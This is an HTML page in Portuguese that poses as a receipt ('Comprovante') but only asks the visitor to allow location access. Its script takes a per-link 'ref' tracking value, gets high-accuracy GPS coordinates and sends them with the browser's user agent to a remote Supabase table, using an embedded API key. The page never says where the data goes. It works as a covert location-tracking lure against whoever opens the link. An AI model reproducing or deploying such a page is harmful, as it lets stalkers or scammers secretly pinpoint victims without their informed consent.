<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Comprovante</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      font-family: Arial, Helvetica, sans-serif;
      background: #f5f6f8;
      color: #222;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #fff;
      border-radius: 18px;
      padding: 40px 28px;
      text-align: center;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
    }

    h1 {
      margin: 0 0 14px;
      font-size: 28px;
      color: #111827;
    }

    p {
      margin: 0 0 28px;
      font-size: 16px;
      line-height: 1.5;
      color: #4b5563;
    }

    button {
      width: 100%;
      border: 0;
      border-radius: 12px;
      padding: 16px;
      background: #111827;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      opacity: 0.7;
      cursor: wait;
    }

    #mensagem {
      margin-top: 18px;
      font-size: 14px;
      line-height: 1.5;
      display: none;
      word-break: break-word;
    }

    .erro {
      color: #dc2626;
    }

    .sucesso {
      color: #16a34a;
    }

    .processando {
      color: #4b5563;
    }
  </style>
</head>

<body>

  <div class="card">

    <h1>Comprovante</h1>

    <p>
      Permitir localização para continuar.
    </p>

    <button id="btnLocalizacao">
      Permitir Localização
    </button>

    <div id="mensagem"></div>

  </div>


  <script>

    // =====================================================
    // SUPABASE
    // =====================================================

    const SUPABASE_URL =
      "https://gotszlmzwkhyymtpnkwp.supabase.co";

    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdvdHN6bG16d2toeXltdHBua3dwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg5NTQ3NjYsImV4cCI6MjEwNDUzMDc2Nn0.HjF8uEBmPw-4rcLf8ZajIit1lhekrhNIvkXbjWEtftg";


    // =====================================================
    // REFERÊNCIA DO LINK
    // =====================================================

    const parametros =
      new URLSearchParams(window.location.search);

    const referencia =
      parametros.get("ref") || null;


    // =====================================================
    // ELEMENTOS
    // =====================================================

    const botao =
      document.getElementById("btnLocalizacao");

    const mensagem =
      document.getElementById("mensagem");


    // =====================================================
    // MENSAGEM
    // =====================================================

    function mostrarMensagem(texto, tipo) {

      mensagem.textContent = texto;

      mensagem.className = tipo;

      mensagem.style.display = "block";

    }


    // =====================================================
    // ENVIAR PARA SUPABASE
    // =====================================================

    async function enviarLocalizacao(posicao) {

      const latitude =
        posicao.coords.latitude;

      const longitude =
        posicao.coords.longitude;

      const precisao =
        posicao.coords.accuracy;


      console.log("Latitude:", latitude);
      console.log("Longitude:", longitude);
      console.log("Precisão:", precisao);


      mostrarMensagem(
        "Localização obtida. Enviando...",
        "processando"
      );


      // ===================================================
      // DADOS
      // ===================================================

      const dados = {

        referencia: referencia,

        latitude: latitude,

        longitude: longitude,

        precisao_metros: precisao || null,

        user_agent: navigator.userAgent,

        ip_address: null,

        capturado_em: new Date().toISOString()

      };


      console.log("Dados enviados:", dados);


      try {

        const resposta = await fetch(

          SUPABASE_URL +
          "/rest/v1/localizacoes",

          {

            method: "POST",

            headers: {

              "Content-Type":
                "application/json",

              "apikey":
                SUPABASE_KEY,

              "Authorization":
                "Bearer " + SUPABASE_KEY,

              "Prefer":
                "return=minimal"

            },

            body:
              JSON.stringify(dados)

          }

        );


        // =================================================
        // LÊ A RESPOSTA DO SUPABASE
        // =================================================

        const textoResposta =
          await resposta.text();


        console.log(
          "Status Supabase:",
          resposta.status
        );

        console.log(
          "Resposta Supabase:",
          textoResposta
        );


        // =================================================
        // ERRO
        // =================================================

        if (!resposta.ok) {

          mostrarMensagem(

            "Erro no Supabase (" +
            resposta.status +
            "): " +
            textoResposta,

            "erro"

          );

          botao.disabled = false;

          botao.textContent =
            "Tentar novamente";

          return;
        }


        // =================================================
        // SUCESSO
        // =================================================

        mostrarMensagem(
          "Localização registrada com sucesso.",
          "sucesso"
        );

        botao.disabled = true;

        botao.textContent =
          "Localização Registrada";


      } catch (erro) {

        console.error(
          "Erro de conexão:",
          erro
        );


        mostrarMensagem(

          "Erro de conexão com o Supabase: " +
          erro.message,

          "erro"

        );


        botao.disabled = false;

        botao.textContent =
          "Tentar novamente";

      }

    }


    // =====================================================
    // ERRO DE GEOLOCALIZAÇÃO
    // =====================================================

    function erroLocalizacao(erro) {

      console.error(
        "Erro de localização:",
        erro
      );


      botao.disabled = false;

      botao.textContent =
        "Permitir Localização";


      if (erro.code === 1) {

        mostrarMensagem(
          "O Safari negou o acesso à localização. Verifique a permissão do site.",
          "erro"
        );

      }

      else if (erro.code === 2) {

        mostrarMensagem(
          "O dispositivo não conseguiu determinar a localização.",
          "erro"
        );

      }

      else if (erro.code === 3) {

        mostrarMensagem(
          "A localização demorou muito para responder.",
          "erro"
        );

      }

      else {

        mostrarMensagem(
          "Erro de localização: " +
          erro.message,
          "erro"
        );

      }

    }


    // =====================================================
    // BOTÃO
    // =====================================================

    botao.addEventListener(
      "click",
      function () {


        if (!navigator.geolocation) {

          mostrarMensagem(
            "Este navegador não suporta geolocalização.",
            "erro"
          );

          return;
        }


        botao.disabled = true;

        botao.textContent =
          "Obtendo localização...";


        mensagem.style.display =
          "none";


        // =================================================
        // SOLICITA LOCALIZAÇÃO
        // =================================================

        navigator.geolocation.getCurrentPosition(

          function (posicao) {

            // IMPORTANTE:
            // O Supabase só é chamado aqui,
            // depois que uma posição válida foi obtida.

            enviarLocalizacao(posicao);

          },

          erroLocalizacao,

          {

            enableHighAccuracy: true,

            timeout: 30000,

            maximumAge: 0

          }

        );

      }
    );

  </script>

</body>
</html>
